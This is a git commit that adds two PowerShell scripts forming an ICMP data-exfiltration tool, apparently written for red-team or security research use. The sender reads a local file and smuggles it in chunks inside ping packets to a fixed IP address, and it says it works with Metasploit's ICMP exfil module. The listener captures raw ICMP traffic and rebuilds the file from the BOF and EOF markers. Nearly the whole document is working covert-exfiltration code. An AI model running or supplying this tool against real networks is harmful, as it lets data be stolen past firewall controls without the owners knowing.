0cf535897c46a59a7bb8ec959e8996494e4c108c
Oddvar Moe <oddvar.moe@advania.no>
2017-07-07 01:09:43 +0200

    First commit

---
+++ Powershell-ICMP-Listener.ps1
@@ -0,0 +1,76 @@
+﻿#    Powershell-ICMP-Listener
+#    ICMP Exfiltration server script
+#    Author: Oddvar Moe (@oddvarmoe)
+#    License: BSD 3-Clause
+#    Required Dependencies: None
+#    Optional Dependencies: None
+#    Early alpha version
+
+# Script will keep running until a ping packet with BOF is received
+# Script will then add the data from the ICMP packet until EOF is received
+
+### NOTES TO MYSELF  ###
+#IP packet stops at [20] 
+#ICMP starts from [21] - https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol 
+#$buffer[9] = Type... 1 = ICMP , 6 = TCP
+#$buffer[12]+[13]+[14]+[15] = source IP
+#$buffer[16]+[17]+[18]+[19] = destination IP
+#$buffer[20] = ICMP Type
+#$buffer[28] = DATA portion of ICMP
+# Entire packet in HEX: [System.BitConverter]::ToString($buffer[0..1499])
+
+# Inspiration and help
+# http://www.drowningintechnicaldebt.com/RoyAshbrook/archive/2013/03/08/how-to-write-a-basic-sniffer-in-powershell.aspx 
+
+# TODO: 
+# Need to find a dynamic way to enumerate filename and length
+# Gain more speed using different methods - IT IS SLOW NOW
+# Convert it to function
+# Confirm transfer of each packet
+# Only allow specified IP to send data
+# Use filename sent from Client script to save on server side
+
+$Outfile = "C:\temp\Exfiltrate.txt"
+
+# Initialize socket and bind
+$ICMPSocket = New-Object System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::Icmp)
+$Address = New-Object system.net.IPEndPoint([system.net.IPAddress]::Parse("192.168.0.74"), 0) 
+$ICMPSocket.bind($Address)
+$ICMPSocket.IOControl([Net.Sockets.IOControlCode]::ReceiveAll, [BitConverter]::GetBytes(1), $null)
+$buffer = new-object byte[] $ICMPSocket.ReceiveBufferSize
+
+# Set Capture to false
+$Capture = $false
+
+while($True)
+{
+        #Only inspect the request packets - type 8
+        # Request
+        if([System.BitConverter]::ToString($buffer[20]) -eq "08")
+        {
+            #IF EOF is received in data segment of ICMP the script will exit the loop.
+            if([System.Text.Encoding]::ASCII.GetString($buffer[28..30]) -eq "EOF")
+            {
+                #create file 
+                [System.Text.Encoding]::ASCII.GetString($Transferbytes) | Out-File $Outfile
+                $Capture = $false
+                break
+            } 
+            
+            
+            if($Capture)
+            {
+                #Capture filecontent into bytearray"
+                [byte[]]$Transferbytes += $buffer[28..1499]
+            }
+            # Byte 28 = BOF
+            if([System.Text.Encoding]::ASCII.GetString($buffer[28..30]) -eq "BOF")
+            {
+                #BOF MATCH
+                # Need to find a dynamic way to enumerate filename
+                $Filename = [System.Text.Encoding]::ASCII.GetString($buffer[31..46])
+                $Capture = $true       
+            } 
+        }
+        $null = $ICMPSocket.Receive($buffer)
+}
---
+++ Powershell-ICMP-Sender.ps1
@@ -0,0 +1,51 @@
+﻿#    Powershell-ICMP-Sender
+#    ICMP Exfiltration script
+#    Author: Oddvar Moe (@oddvarmoe)
+#    License: BSD 3-Clause
+#    Required Dependencies: None
+#    Optional Dependencies: None
+#    Early alpha version
+
+# Script will take the infile you specify in the $inFile variable and divide it into 1472 byte chunks before sending
+# This script also works with Metasploit's ICMP Exfil module: https://www.rapid7.com/db/modules/auxiliary/server/icmp_exfil
+# Inspiration from : https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1
+
+# TODO:
+# Need transfer check
+# Speeding it up using different methods
+# Make it function based
+
+    $IPAddress = "192.168.0.74"
+    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
+    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
+    $PingOptions.DontFragment = $true
+    #$PingOptions.Ttl = 10
+    
+    # Must be divided into 1472 chunks
+    [int]$bufSize = 1472
+    $inFile = "C:\temp\test2.txt"
+    
+
+    $stream = [System.IO.File]::OpenRead($inFile)
+    $chunkNum = 1
+    $barr = New-Object byte[] $bufSize
+    
+    # Start of Transfer
+    $sendbytes = ([text.encoding]::ASCII).GetBytes("BOFAwesomefile.txt")
+    $ICMPClient.Send($IPAddress,10, $sendbytes, $PingOptions) | Out-Null
+
+
+    while ($bytesRead = $stream.Read($barr, 0, $bufsize)) {
+        $ICMPClient.Send($IPAddress,10, $barr, $PingOptions) | Out-Null
+        $ICMPClient.PingCompleted
+        
+        #Missing check if transfer is okay, added sleep.
+        sleep 1
+        #$ICMPClient.SendAsync($IPAddress,60 * 1000, $barr, $PingOptions) | Out-Null
+        Write-Output "Done with $chunkNum"
+        $chunkNum += 1
+    }
+
+    # End the transfer
+    $sendbytes = ([text.encoding]::ASCII).GetBytes("EOF")
+    $ICMPClient.Send($IPAddress,10, $sendbytes, $PingOptions) | Out-Null
